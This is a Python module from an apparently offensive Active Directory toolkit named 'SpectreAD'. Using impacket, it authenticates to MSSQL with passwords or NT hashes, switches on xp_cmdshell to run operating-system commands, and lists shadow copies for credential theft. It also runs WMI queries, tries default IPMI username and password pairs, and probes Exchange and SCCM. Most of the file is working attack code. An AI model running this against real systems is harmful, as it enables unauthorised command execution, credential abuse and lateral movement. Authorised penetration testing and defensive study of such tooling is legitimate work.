"""
SpectreAD :: core/protocols.py
MSSQL, VSS, WMI, IPMI, Exchange, SCCM.

Author : Inayat Hussain
"""

from __future__ import annotations

import shutil
import subprocess

from core import ui
from core.creds import resolve
from core.store import open_store


def mssql(args) -> None:
    from impacket.tds import MSSQL

    with open_store(args.store) as store:
        cred = resolve(args, store)
        domain, user, pwd, lm, nt = cred.to_impacket()

        ms = MSSQL(args.target, args.target, args.target, None)
        try:
            ms.connect()
            ms.login(domain, user, pwd, lm, nt, None, None, None, useWindowsAuth=True)
        except Exception as exc:
            ui.fail(f"login: {exc}")
            return

        ui.ok(f"authenticated to MSSQL on {args.target}")
        if args.database:
            ms.sql_query(f"USE {args.database}")
        query = args.query or ("SELECT @@version; SELECT SYSTEM_USER; "
                               "SELECT IS_SRVROLEMEMBER('sysadmin');")
        rows = ms.sql_query(query)
        for row in rows:
            ui.ok(" | ".join("" if c is None else str(c) for c in row))
        store.add_finding("high", "MSSQL access", f"login on {args.target}", host=args.target)

        if args.exec_cmd:
            ui.edge(f"xp_cmdshell: {args.exec_cmd}")
            ms.sql_query("EXEC sp_configure 'show advanced options',1; RECONFIGURE;")
            ms.sql_query("EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;")
            for row in ms.sql_query(f"EXEC xp_cmdshell '{args.exec_cmd}'"):
                ui.ok("".join(str(c) for c in row if c))
        ms.disconnect()


def vss(args) -> None:
    from core.transport import smb as smb_conn

    with open_store(args.store) as store:
        cred = resolve(args, store)
        conn = smb_conn(args.target, cred)
        try:
            conn.connectTree("C$")
            ui.info(f"C$ reachable ({len(conn.listPath('C$', chr(92) + '*'))} entries)")
        except Exception as exc:
            ui.fail(str(exc))
        finally:
            conn.logoff()

        if shutil.which("impacket-vssown"):
            subprocess.run(["impacket-vssown",
                            f"{args.domain}/{cred.username}@{args.target}", "list"],
                           check=False)
        else:
            ui.warn("impacket-vssown missing — use: atexec 'vssadmin list shadows'")
        store.log("vss", "list", args.target)


def wmi(args) -> None:
    from impacket.dcerpc.v5.dcom import wmi
    from impacket.dcerpc.v5.dcomrt import DCOMConnection

    with open_store(args.store) as store:
        cred = resolve(args, store)
        dcom = DCOMConnection(args.target, cred.username, cred.secret, cred.domain,
                              cred.lmhash or None, cred.nthash or None,
                              oxidResolver=True)
        try:
            iface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,
                                            wmi.IID_IWbemLevel1Login)
            login = wmi.IWbemLevel1Login(iface)
            svc = login.NTLMLogin("//./root/cimv2", None, None)
            q = args.query or "SELECT Caption, Version FROM Win32_OperatingSystem"
            ui.edge(q)
            for item in svc.ExecQuery(q).fetch_all():
                print({k: v for k, v in item.getProperties().items()
                       if not k.startswith("__")})
        except Exception as exc:
            ui.fail(str(exc))
        finally:
            dcom.disconnect()


def ipmi(args) -> None:
    if not shutil.which("ipmitool"):
        ui.warn("ipmitool not installed")
        return
    for user in ("ADMIN", "admin", "root"):
        for pw in ("ADMIN", "admin", "password", ""):
            r = subprocess.run(["ipmitool", "-I", "lanplus", "-H", args.target,
                                "-U", user, "-P", pw, "mc", "info"],
                               capture_output=True, text=True)
            if r.returncode == 0:
                ui.ok(f"IPMI {user}:{pw}")
                print(r.stdout[:400])
                return
    ui.fail("no default IPMI credential worked")


def exchange(args) -> None:
    from core.transport import tcp_open

    for port, label in ((443, "https"), (80, "http"), (25, "smtp")):
        if tcp_open(args.target, port):
            ui.ok(f"{label} open on {args.target}")
    try:
        import dns.resolver
        res = dns.resolver.Resolver()
        for rec in ("_autodiscover._tcp", "_smtp._tcp"):
            try:
                for a in res.resolve(f"{rec}.{args.domain}", "SRV"):
                    ui.ok(f"{rec} -> {a.target}:{a.port}")
            except Exception:
                pass
    except ImportError:
        pass


def sccm(args) -> None:
    from core.transport import smb as smb_conn

    with open_store(args.store) as store:
        cred = resolve(args, store)
        conn = smb_conn(args.target, cred)
        try:
            for share in ("SMS_DP$", "SMS_SITE", "SCCMContentLib$"):
                try:
                    conn.connectTree(share)
                    ui.ok(f"{share} accessible — SCCM distribution point")
                except Exception:
                    pass
        finally:
            conn.logoff()
        store.log("sccm", "probe", args.target)
